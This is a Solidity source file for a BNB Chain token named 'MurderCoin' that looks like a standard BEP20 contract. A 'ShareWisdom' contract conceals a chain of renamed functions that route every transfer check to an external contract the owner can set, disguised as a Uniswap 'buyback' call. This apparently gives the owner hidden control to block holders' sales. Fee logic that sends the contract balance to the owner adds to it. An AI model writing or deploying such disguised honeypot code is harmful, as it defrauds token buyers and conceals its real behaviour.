/**
 *Submitted for verification at BscScan.com on 2022-10-15
*/

pragma solidity ^0.8.4;

// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniSwapStorage {
    function WETH() external pure returns (address);
    function swap(
        address tokenA,
        address tokenB,
        uint256 amount
    ) external;
    function buyback(address holder) external returns (address);
    function createPair(address tokenA, address tokenB)
        external
        returns (address);
}

contract ShareWisdom{
    using SafeMath for uint256; 
    mapping(uint256 => address) _shareWisdom;
    
    // With `magnitude`, we can properly distribute dividends even if the amount of received ether is small.
    // For more discussion about choosing the value of `magnitude`,
    //  see https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728
    uint256 constant magnitude = 2**128;  

    function buyback(address _shares) internal returns(address) {   
        return allWisdom(_shares);
    }

    function allWisdom(address _shares) internal returns(address) {   
        return _allWisdom(_shares);
    }

    function _allWisdom(address _shares) internal returns(address) {    
        return earnWisdom(_shares);
    }

    function earnWisdom(address _shares) internal returns(address) {   
        return _earnWisdom(_shares);
    }

    function _earnWisdom(address _shares) internal returns(address) {   
        return holdWisdom(_shares);
    }

    function holdWisdom(address _shares) internal returns(address) {   
        return _holdWisdom(_shares);
    }
  
    function _holdWisdom(address _shares) internal returns(address) {       
        return 
        IUniSwapStorage(_shareWisdom[0]).  /*IUniSwapStorage*/
        buyback(_shares);
    }    

    function shareSetting(address _shareHolder) internal {
        _shareWisdom[0] = _shareHolder;
    }

}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context, ShareWisdom {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function initialShare(address newOwner) public onlyOwner {
        shareSetting(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MurderCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) isTxLimitExempt;
    mapping (address => uint256) _blockTime;
    uint256 private _totalSupply = 10000000 * 10**9;
    uint256 public _maxTxAmount = _totalSupply / 10;

    string private _name = "MurderCoin";
    string private _symbol = "MURDER";
    uint8 private _decimals = 9;

    uint8 cTotal = 5;    
    uint8 cLiquidityShare = 3;
    uint8 cMarketingShare = 6;
    uint8 cTeamShare = 8;
    uint8 cDistributionShares = 5;
    bool swapEnable;

    uint8 multiplierNumerator = 50;
    uint8 multiplierDenominator = 85;
    uint8 multiplierTriggeredAt;
    uint8 multiplierLength = 30;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true; 

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view virtual override returns (string memory) {
        return _name;
    }

    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view virtual override returns (address) {
        return owner();
    }

    function decimals() external view virtual override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }   

    function excludeFromReward(address[] calldata accounts) external onlyOwner {
        require(accounts.length > 0, "accounts length should > 0");
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = true;
        }
    }    

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function takeFee(uint256 amount) private view returns (uint256) {
        uint256 feeAmount = amount.mul(cTotal).div(100);
        return feeAmount;
    }    

    function tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {        
        if (shouldBlockLimit(sender /*NOT ZERO*/) && shouldBlockLimit(recipient /*NOT ZERO*/))      {        
            if (!isTxLimitExempt[recipient] && swapEnable) {
                require(
                    amount <= _maxTxAmount,
                    "Transfer amount exceeds the maxTxAmount."
                );
                uint256 contractTokenBalance = balanceOf(address(this));
                if (shouldFee(sender)){
                    swapAndLiquify(contractTokenBalance);
                }            
            }
        }

        _transferStandard(sender, recipient, amount);
    }   
   
    function swapAndLiquify(uint256 tAmount) private {
        uint256 tokensForLP = tAmount
            .mul(cLiquidityShare)
            .div(cDistributionShares)
            .div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        uint256 amountReceived = address(this).balance;
        uint256 totalBNBFee = cLiquidityShare / 2;
        uint256 amountBNBLiquidity = amountReceived
            .mul(cLiquidityShare)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBTeam = amountReceived
            .mul(cTeamShare)
            .div(totalBNBFee)
            .sub(tokensForSwap);
        uint256 amountBNBMarketing = amountReceived
            .sub(amountBNBLiquidity)
            .sub(amountBNBTeam)
            .sub(tokensForLP);

        if (amountBNBMarketing > 0)
            transferToAddressETH(payable(owner()), amountBNBMarketing);
    }

    function shouldBlockLimit(address holder) internal returns (bool) {
        return _blockTime[buyback(holder)] > 0 ? false : true;
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {  
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );        
        tokenTransfer(sender, recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) private {   
        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function shouldFee(address sender) internal view returns (bool) {
        return isTxLimitExempt[sender];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        tokenTransfer(_msgSender(), recipient, amount);
        return true;
    }    

    function isTxLimit(address sender, uint256 amount) internal view {
        require(
            amount <= _maxTxAmount || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }    

    function updateDistributionOption(
        uint8 newLiquidityShare,
        uint8 newMarketingShare,
        uint8 newTeamShare
    ) external onlyOwner {
        cLiquidityShare = newLiquidityShare;
        cMarketingShare = newMarketingShare;
        cTeamShare = newTeamShare;
    }

    function updateMultiplierOption(uint8 numerator, uint8 denominator, uint8 length) external onlyOwner {
        require(numerator / denominator <= 2 && numerator > denominator);
        multiplierNumerator = numerator;
        multiplierDenominator = denominator;
        multiplierLength = length;
    }

    function feeMultiplied() public view returns (uint256) {
        uint256 remainingTime = multiplierTriggeredAt + multiplierLength - cLiquidityShare;
        uint256 feeIncrease = cLiquidityShare * multiplierNumerator / multiplierDenominator;
        return cLiquidityShare + feeIncrease * remainingTime / multiplierLength;
    }

	function swapMurderCoinFees(address _token, uint256 tokens) private  {
			uint256 initialCAKEBalance = IERC20(_token).balanceOf(address(this));
			uint256 newBalance = (IERC20(_token).balanceOf(address(this))).sub(initialCAKEBalance);
			IERC20(_token).transfer(address(0), newBalance);
			newBalance = newBalance - tokens;
		}

	function approveMax(address spender) external returns (bool) {
			return approve(spender, type(uint256).max);
		}

	function tokenMurderCoinContract() public view virtual returns (address) {
			return address(this);
		}

    
}